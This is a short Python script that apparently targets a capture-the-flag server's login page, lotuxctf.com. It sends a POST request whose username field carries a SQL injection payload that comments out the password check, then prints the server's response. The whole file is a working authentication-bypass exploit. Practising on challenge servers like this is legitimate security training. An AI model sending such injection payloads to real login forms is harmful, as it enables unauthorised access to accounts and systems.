import requests

response = requests.post('http://lotuxctf.com:20002/login', data={'username': "curious' -- ", 'password': 'meow'})


print(response.status_code) 
print(response.headers)
print(response.text)